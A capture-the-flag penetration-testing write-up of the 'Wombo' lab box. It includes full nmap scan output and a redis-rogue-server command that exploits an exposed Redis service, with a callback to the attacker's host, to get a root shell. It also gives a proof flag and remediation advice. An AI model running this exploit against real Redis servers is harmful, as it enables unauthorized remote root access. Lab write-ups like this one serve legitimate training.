---
layout: default
title: x006-Wombo
nav_order: 2
has_children: false
parent: ProvingGrounds
grand_parent: Writeups
---

## x006-Wombo

### Abstract
Linux box running web server,, mongo DB and Redis. The redis service was vulnerable to an exploit allowing us the initial access. As the service was running as root, the access was the one of the root user.

### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what servies are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.



| Server IP Adress | Ports Open |
|------------------|------------|
|  192.168.222.69         | TCP : 22,80, 6379, 8080, 27017    |
|                  | UDP :      |



**Nmap Scan Results:**

Using  :
```sh
nmap -Pn -n -p- --min-rate 4000 --open -sCV $IP
```

Result :
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 15:05 CEST
Nmap scan report for 192.168.222.69
Host is up (0.027s latency).
Not shown: 65529 filtered tcp ports (no-response), 1 closed tcp port (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
80/tcp    open  http       nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
6379/tcp  open  redis      Redis key-value store 5.0.9
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=J4GctET-pw5AtMo6o6DqFEl2; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-/Iz8oJX+vt8D7PbPRGIuZ8TzG2M"
|     Vary: Accept-Encoding
|     Date: Sun, 15 May 2022 13:04:28 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=WlC3F8k0EpbrhauuX8lc9T-O; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-XHzqIpxh22jPcHs40188qgmzpY0"
|     Vary: Accept-Encoding
|     Date: Sun, 15 May 2022 13:04:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Sun, 15 May 2022 13:04:27 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
27017/tcp open  mongodb    MongoDB 4.0.18
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
| mongodb-databases: 
|   code = 13
|   errmsg = command listDatabases requires authentication
|   ok = 0.0
|_  codeName = Unauthorized
| mongodb-info: 
|   MongoDB Build info
|     storageEngines
|       2 = mmapv1
|       3 = wiredTiger
|       0 = devnull
|       1 = ephemeralForTest
|     javascriptEngine = mozjs
|     buildEnvironment
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       distmod = debian92
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       target_os = linux
|       target_arch = x86_64
|       distarch = x86_64
|     ok = 1.0
|     sysInfo = deprecated
|     bits = 64
|     version = 4.0.18
|     maxBsonObjectSize = 16777216
|     allocator = tcmalloc
|     openssl
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|       running = OpenSSL 1.1.0l  10 Sep 2019
|     debug = false
|     versionArray
|       2 = 18
|       3 = 0
|       0 = 4
|       1 = 0
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     modules
|   Server status
|     code = 13
|     errmsg = command serverStatus requires authentication
|     ok = 0.0
|_    codeName = Unauthorized
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=5/15%Time=6280FABF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1508,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20off
SF:\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=b
SF:lock\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Powere
SF:d-By:\x20NodeBB\r\nset-cookie:\x20_csrf=WlC3F8k0EpbrhauuX8lc9T-O;\x20Pa
SF:th=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x2018181\r\nETag:\x20W/\"4705-XHzqIpxh22jPcHs40188qgmzpY0\"\r\nVary:\x
SF:20Accept-Encoding\r\nDate:\x20Sun,\x2015\x20May\x202022\x2013:04:27\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=
SF:\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\
SF:r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\
SF:"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D
SF:;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;
SF:\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capab
SF:le\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable
SF:\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x20co
SF:ntent")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Con
SF:trol:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x
SF:20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x20
SF:1;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin
SF:\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8-ZR
SF:Af8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20Sun
SF:,\x2015\x20May\x202022\x2013:04:27\x20GMT\r\nConnection:\x20close\r\n\r
SF:\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x20404
SF:\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Options:\
SF:x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-Poli
SF:cy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\nse
SF:t-cookie:\x20_csrf=J4GctET-pw5AtMo6o6DqFEl2;\x20Path=/\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:\x2
SF:0W/\"2b5a-/Iz8oJX\+vt8D7PbPRGIuZ8TzG2M\"\r\nVary:\x20Accept-Encoding\r\
SF:nDate:\x20Sun,\x2015\x20May\x202022\x2013:04:28\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-di
SF:r=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<titl
SF:e>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\"\
SF:x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x20/
SF:>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charset=
SF:UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20cont
SF:ent=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20conten
SF:t=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.73 seconds

```

**Vulnerability Exploited:**

Redis RCE using [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

**Vulnerability Explanation:**

Using redis-rogue-server, we could run the following command : 

```bash
python3 redis-rogue-server.py --rhost=192.168.222.69 --lhost=192.168.49.222 --lport=6379
```

It allows us to gain an interactive access to the machine (reverse shell is also possible)

**Vulnerability Fix:**

Update redis version.

**Severity:** Critical

**Proof of Concept / Code Here:**
![](attachments/Pasted%20image%2020220515165129.png)

**Local.txt Proof Screenshot**

No local

**Local.txt Contents**

No local
### Privilege Escalation

**Vulnerability Exploited:**

Server running as root

**Vulnerability Explanation:**

The redis server is executed as root so our initial access allows us to have directly access as root.

**Vulnerability Fix:**

Run the service with a dedicated user having just the right permission and not the root user.

**Severity:** Critical

**Proof of Concept / Code Here:**

No code has been written for this exploit. 

**Proof Screenshot Here:**
![](attachments/Pasted%20image%2020220515164053.png)

**Proof.txt Contents:**

`aeecd2b2bdcab7676cc9847027c93919`

--------

## NOTES : 

Nothing found using gobuster on both webserver
The access to the application coudln't be reach. 
